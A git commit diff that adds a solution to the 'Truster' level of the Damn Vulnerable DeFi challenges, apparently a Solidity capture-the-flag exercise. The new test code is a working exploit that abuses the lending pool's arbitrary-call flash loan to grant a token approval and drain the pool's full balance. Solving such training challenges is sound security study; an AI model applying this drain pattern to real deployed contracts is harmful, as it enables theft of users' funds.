8bc8294f27c32bc8004373e970e13a1b6c376f7a
codebasebo <ucheroyal1999@gmail.com>
2025-05-01 15:00:44 +0100

    Truster

--- test/truster/Truster.t.sol
+++ test/truster/Truster.t.sol
@@ -6,6 +6,24 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
+
+contract TrustExploiter{
+    constructor(address _pool, address _token, address _recovery) {
+        // Cast the address to DamnValuableToken to access balanceOf function
+        DamnValuableToken token = DamnValuableToken(_token);
+        uint256 poolBalance = token.balanceOf(_pool);
+        
+        // Generate approval data to give the player permission to move tokens
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
+        
+        // Call the flashLoan function with zero borrowing but use the data parameter to approve
+        TrusterLenderPool(_pool).flashLoan(0, address(this), _token, data);
+        
+        // Transfer all tokens from the pool to the recovery address
+        token.transferFrom(_pool, _recovery, poolBalance);
+    }
+}
+
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -39,6 +57,22 @@ contract TrusterChallenge is Test {
     }
 
     /**
+    
+     */
+    function _carryOutAttack(address _pool, address _token) internal {
+        // Generate approval data to give the player permission to move tokens
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", player, TOKENS_IN_POOL);
+        
+        // Call the flashLoan function with zero borrowing but use the data parameter to approve
+        // This will be executed as player due to the checkSolvedByPlayer modifier
+        TrusterLenderPool(_pool).flashLoan(0, player, _token, data);
+        
+        // Transfer all tokens from the pool to the recovery address
+        // This is still executed as the player (from the modifier)
+        DamnValuableToken(address(_token)).transferFrom(address(_pool), recovery, TOKENS_IN_POOL);
+   }
+
+    /**
      * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
      */
     function test_assertInitialState() public view {
@@ -51,7 +85,10 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        // Exploit the TrusterLenderPool contract
+        new TrustExploiter(address(pool), address(token), recovery);
+
+       
     }
 
     /**
